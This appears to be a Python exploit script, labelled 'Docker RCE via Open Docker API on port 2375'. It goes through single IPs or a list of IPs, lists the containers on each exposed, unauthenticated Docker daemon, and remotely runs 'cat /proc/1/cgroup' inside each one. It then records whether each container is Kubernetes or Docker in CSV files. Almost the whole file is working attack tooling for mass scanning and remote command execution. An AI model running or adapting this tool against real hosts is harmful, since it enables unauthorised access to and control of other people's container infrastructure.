from __future__ import print_function
import requests
import subprocess

import sys
import socket
import argparse
import os
import csv

hasDocker = False

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False


def check_docker():
    global hasDocker
    
    if hasDocker:
        return
    
    try:
        result = subprocess.run(['docker', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Docker is installed on your system")
        print(result.stdout.decode('utf-8'))
        hasDocker = True
    except Exception as e:
        print("Docker is not installed on your system")
        print("Please install Docker engine by following the instructions here: https://docs.docker.com/engine/installation/")

def run_docker_command(command):
    global hasDocker
    if not hasDocker:
        check_docker()

    result = subprocess.run(["docker", *command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode('utf-8'), result.stderr.decode('utf-8')

def write_to_csv(ip, port, containers):
    header = ["container name", "container id", "deploy in"]
    result_containers = []
    filename = "output/{}.csv".format(ip)
    
    for container in containers:
        container_id = container['Id']
        container_name = container['Names'][0].replace('/','')
        cmd = ["-H {}:{}".format(ip,port), "exec", container_id, "cat", "/proc/1/cgroup"]
        output, error = run_docker_command(cmd)
        if "kubepods" in output:
            result_containers.append([container_name, container_id, "Kubernetes"])
        elif "docker" in output:
            result_containers.append([container_name, container_id, "Docker"])
        else:
            result_containers.append([container_name, container_id, "Error"])

    if not os.path.exists('output'):
        os.makedirs('output')
    
    if os.path.exists(filename):
        with open(filename, 'a', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([])
    else:
        open(filename, 'w').close()

    with open(filename, 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["IP {} has {} container".format(ip, len(containers))])
        writer.writerow(header)
        writer.writerows(result_containers)
        writer.writerow([])


def exploit(ip, port):
    name          = "docker"
    description   = "Docker RCE via Open Docker API on port 2375"
    author        = "Edisc"

    # Step 1 - Extract container id and container names from each container
    data = "containers/json"
    url  = "http://{}:{}/{}".format(ip, port, data)
    r = requests.get(url)

    if r.json:
        print("="*100)
        print("[+] ip: {} has {} containers".format(ip, len(r.json())))
        containers = r.json()
        write_to_csv(ip, port, containers)

                


            

def main():

    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-ip", help="IP address to be exploited")
    group.add_argument("-iL", help="File containing a list of IP addresses to be exploited")
    parser.add_argument("-p", "--port", type=int, default=2375, help="Port number to be used in the exploitation")
    args = parser.parse_args()

    if args.ip:
        if not is_valid_ip(args.ip):
            print("The provided IP address is not valid.")
            sys.exit()
        exploit(args.ip, args.port)
    elif args.iL:
        with open(args.iL, 'r') as f:
            for line in f:
                line = line.strip()
                if is_valid_ip(line):
                    exploit(line, args.port)
                else:
                    print("The IP address '{}' in the file is not valid.".format(line))


if __name__ == "__main__":
    main()

